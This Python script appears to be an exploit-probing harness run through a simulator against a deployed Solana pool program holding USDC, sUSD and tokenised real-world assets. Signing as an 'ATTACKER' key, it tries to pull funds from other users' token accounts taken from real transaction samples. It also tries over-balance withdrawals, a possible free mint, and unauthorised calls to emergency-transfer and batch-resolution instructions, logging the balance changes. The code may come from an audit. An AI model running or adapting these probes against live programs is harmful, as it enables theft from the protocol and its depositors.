#!/usr/bin/env python3
"""battery2.py - user-level deposit/withdraw probes + gating re-tests with correct mut flags."""
import json, sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import solsim as S, solrpc as rpc, pda

PROG="s1aysqpEyZyijPybUV89oBGeooXrR22wMNLjnG2SWJA"
POOL="FhVcYNEe58SMtxpZGnTu2kpYJrTu2vwCZDGpPLqbd2yG"
USDC="EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
SUSD="susdabGDNbhrnCa6ncrYo81u4s9GM8ecK2UwMyZiq4X"
MANAGER="7671j7qpSf9X5KbQDraXReGK8Dxg5xGjr9n913BWhqru"
OPERATOR="AxnDY6nekRa4hEY1rm1g11A51EPPU29iAXXxh8vAqpM8"
RATEAUTH="uRwMu2114gN23NZVFxkjM6Dwk1iqSc1LLQsHMmiT6Lr"
FEERECIP="3NC1UF4pus6ditVzbcJCLFCVyBLVJm2kxKMhb3mPAoaz"
POOL_USDC_MAIN="DN2KzAeiHFnndVpjWSTw8UkwF9PZaFSthSnVoW1MVThQ"
POOL_SUSD_VAULT="FfELPrBpJBzyND1xTM6NmXRaQJbuP8c5J8jmJWZvDJds"
POOL_USDC_WITHDRAW="usdcLDuDT41YeWcbiMLJ6AoqTumSbJtTQCebJsZJsih"
OPENEDEN="9HhZLsdF8pGQ9fuSJH5UnqJyXBeuMJ729eYVesXCC6mc"
SUSDOFF="5P5xvu52ocJegFgdynRB2MtCJNbnw2jt6vbiAtFB8zQz"
SUNSET="EtKFLi9f8HnUpDbc9y8KeaA1dbYeYgUq34ruAJ9P2cZh"
RWA_VAULT="G9UFgtiWKkuJ2ekuYJJpYxdk8hbNjNkzPcN7p2xd4gkd"
POOL_RWA_MAIN="2pR6cGbrJz9EAdo2Qo9eiUkNa75QZRLGX4bhpdMXnFRM"
HOOK="48n7YGEww7fKMfJ5gJ3sQC3rM6RWGjpUsghqVfXVkR5A"
EXTRAMETAS="9sQhAH7vV3RKTCK13VY4EiNjs3qBq1srSYxdNufdAAXm"
PAUSE="98wFF5MpMjMQbfDF2MPzo8LCGX37unZR1ohRA1mU9GmJ"
FEE_SUSD_ACCT="CApp5oy3HBXrEWkXcTcKhVeWdE2ghDqivXeUYnpMoLTN"
CUSDO="BnANu5CtUogLqcvBNByJuwaRvRxNtVuDcAytwjsUUtqs"
ATA="ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"
TOKEN="TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
TOKEN22="TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
SYS="11111111111111111111111111111111"

_D = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "discriminators.json")))["instructions"]
D = {v: k for k, v in _D.items()}
def disc(n): return bytes.fromhex(D[n])
def W(k): return (k, True, False)
def R(k): return (k, False, False)
def SG(k): return (k, True, True)

ATTACKER = "743QjwzJdZwRibbPAc4ie73JeM7aWyCZtFT3ZVJXuVN8"
ATT_USDC = pda.ata(ATTACKER, USDC)
ATT_SUSD = pda.ata(ATTACKER, SUSD, TOKEN22)

def bal(tokacct):
    r = rpc.rpc("getTokenAccountBalance", [tokacct, {"commitment":"confirmed"}])
    return r.get("result", {}).get("value")

print("attacker", ATTACKER)
print("  USDC ata", ATT_USDC, bal(ATT_USDC))
print("  sUSD ata", ATT_SUSD, bal(ATT_SUSD))

results = []
def run(label, signer, ixs, ew=(), er=()):
    r = S.run(label, signer, ixs, ew, er)
    results.append(r)
    print("##", label, "=> err:", r.get("err"), "cu:", r.get("cu"))
    for l in (r.get("logs") or []):
        if "failed" in l or "Error" in l or "log:" in l:
            print("    ", l)
    # deltas
    pre = {b["accountIndex"]: int(b["uiTokenAmount"]["amount"]) for b in (r.get("pre") or [])}
    post = {b["accountIndex"]: int(b["uiTokenAmount"]["amount"]) for b in (r.get("post") or [])}
    for i in sorted(set(pre)|set(post)):
        if pre.get(i) != post.get(i):
            print("     delta idx%d %s -> %s (d=%s)" % (i, pre.get(i), post.get(i), (post.get(i) or 0)-(pre.get(i) or 0)))
    print()
    return r

# ---- deposit control with fresh nonce ----
NONCE = 98765432101
dp = pda.proof_pda("deposit_proof", POOL, ATTACKER, NONCE, PROG)
amt = 1_000_000  # 1 USDC
run("deposit_1usdc_control", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(ATT_USDC), W(POOL_USDC_MAIN), R(SUSD), W(ATT_SUSD), W(POOL),
           W(dp), R(ATA), R(TOKEN), R(TOKEN22), R(SYS)],
    disc("deposit") + NONCE.to_bytes(8,"little") + amt.to_bytes(8,"little"))])

# ---- deposit 1 raw unit ----
NONCE2 = 98765432102
dp2 = pda.proof_pda("deposit_proof", POOL, ATTACKER, NONCE2, PROG)
run("deposit_1raw_control", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(ATT_USDC), W(POOL_USDC_MAIN), R(SUSD), W(ATT_SUSD), W(POOL),
           W(dp2), R(ATA), R(TOKEN), R(TOKEN22), R(SYS)],
    disc("deposit") + NONCE2.to_bytes(8,"little") + (1).to_bytes(8,"little"))])

# ---- deposit 0 ----
NONCE3 = 98765432103
dp3 = pda.proof_pda("deposit_proof", POOL, ATTACKER, NONCE3, PROG)
run("deposit_0", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(ATT_USDC), W(POOL_USDC_MAIN), R(SUSD), W(ATT_SUSD), W(POOL),
           W(dp3), R(ATA), R(TOKEN), R(TOKEN22), R(SYS)],
    disc("deposit") + NONCE3.to_bytes(8,"little") + (0).to_bytes(8,"little"))])

# ---- deposit with victim USDC account (someone else's) ----
VICTIM_USDC = "HAmZp8VyDb6sZXoA2viQPKY64SGjvimngYWFqK6Nme1d"  # this IS attacker's; pick another user
VICTIM_USDC = "23n6ncQYGqzV6c4pxBqFjMEfENHJYYqfQQS82pUBAW5f"  # from a real deposit sample
NONCE4 = 98765432104
dp4 = pda.proof_pda("deposit_proof", POOL, ATTACKER, NONCE4, PROG)
run("deposit_victim_usdc_acct", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(VICTIM_USDC), W(POOL_USDC_MAIN), R(SUSD), W(ATT_SUSD), W(POOL),
           W(dp4), R(ATA), R(TOKEN), R(TOKEN22), R(SYS)],
    disc("deposit") + NONCE4.to_bytes(8,"little") + (1_000_000).to_bytes(8,"little"))])

# ---- withdraw control fresh nonce ----
WNONCE = 98765432111
wp = pda.proof_pda("withdraw_proof", POOL, ATTACKER, WNONCE, PROG)
wamt = 100_000  # 0.1 sUSD raw
run("withdraw_0.1susd_control", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(ATT_USDC), R(SUSD), W(ATT_SUSD), W(POOL_SUSD_VAULT), W(POOL),
           W(wp), R(ATA), R(TOKEN), R(TOKEN22), R(SYS)],
    disc("withdraw") + WNONCE.to_bytes(8,"little") + wamt.to_bytes(8,"little"))])

# ---- withdraw with victim sUSD vault ----
VICTIM_SUSD = "EVoog4HcyNrkX4B8chUwACq29CiKjhVLWFpfauUPo1HM"  # attacker's own; use other
VICTIM_SUSD = "95iFVLL5JGkUgvRjYuNNhSe16LGWVYercF9yXbNey9ce"  # from a real withdraw sample
WNONCE2 = 98765432112
wp2 = pda.proof_pda("withdraw_proof", POOL, ATTACKER, WNONCE2, PROG)
run("withdraw_victim_susd_vault", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(ATT_USDC), R(SUSD), W(VICTIM_SUSD), W(POOL_SUSD_VAULT), W(POOL),
           W(wp2), R(ATA), R(TOKEN), R(TOKEN22), R(SYS)],
    disc("withdraw") + WNONCE2.to_bytes(8,"little") + (1000).to_bytes(8,"little"))])

# ---- withdraw more than balance ----
WNONCE3 = 98765432113
wp3 = pda.proof_pda("withdraw_proof", POOL, ATTACKER, WNONCE3, PROG)
run("withdraw_over_balance", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(ATT_USDC), R(SUSD), W(ATT_SUSD), W(POOL_SUSD_VAULT), W(POOL),
           W(wp3), R(ATA), R(TOKEN), R(TOKEN22), R(SYS)],
    disc("withdraw") + WNONCE3.to_bytes(8,"little") + (10**18).to_bytes(8,"little"))])

# ---- handleFrozenAccounts attacker (free mint?) ----
run("handleFrozenAccounts_attacker", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(SUSD), W(ATT_SUSD), W(POOL), W(SUSDOFF), R(TOKEN22)],
    disc("handle_frozen_accounts"))])

# ---- gating re-tests with correct mut flags ----
run("resolve_batch_withdraw_attacker_mutfix", ATTACKER, [(
    PROG, [SG(ATTACKER), W(FEERECIP), R(USDC), W(POOL_USDC_MAIN), W(POOL_USDC_WITHDRAW),
           W(SUSD), W(POOL_SUSD_VAULT), W(POOL), W(OPENEDEN), R(ATA), R(TOKEN), R(TOKEN22)],
    disc("resolve_batch_withdraw"))])
run("emergency_transfer_attacker_mutfix", ATTACKER, [(
    PROG, [SG(ATTACKER), W(POOL), R(OPENEDEN), R(CUSDO), W(POOL_RWA_MAIN), W(RWA_VAULT),
           R(HOOK), R(EXTRAMETAS), W(PAUSE), R(TOKEN22)],
    disc("emergency_transfer_rwa_token") + (1).to_bytes(8,"little"))])
run("create_susd_offset_pda_attacker_mutfix", ATTACKER, [(
    PROG, [SG(ATTACKER), W(POOL), W(SUSDOFF), R(SYS)],
    disc("create_susd_offset_pda") + (1).to_bytes(8,"little"))])
run("initiate_batch_deposit_attacker", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(POOL_USDC_MAIN), W(POOL), R(OPENEDEN), W(RWA_VAULT), R(TOKEN)],
    disc("initiate_batch_deposit"))])
run("resolve_batch_deposit_attacker", ATTACKER, [(
    PROG, [SG(ATTACKER), W(FEERECIP), W(SUSD), W(POOL), W(SUSDOFF), W(OPENEDEN), R(CUSDO),
           W(POOL_RWA_MAIN), W("cusdzR5sDbSnW5sUpoE6Y57nmBoEva6BSb1ZxWPizkD"), R(HOOK), R(EXTRAMETAS),
           W(PAUSE), R(TOKEN22)], disc("resolve_batch_deposit"))])
run("sunset_initiate_batch_withdraw_attacker", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(SUSD), W(POOL), W(POOL_SUSD_VAULT), W(SUSDOFF), R(OPENEDEN),
           R(CUSDO), W(RWA_VAULT), W(POOL_RWA_MAIN), R(HOOK), R(EXTRAMETAS), W(PAUSE), R(TOKEN22)],
    disc("sunset_initiate_batch_withdraw"))])

json.dump(results, open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "battery2.json"), "w"), indent=1)
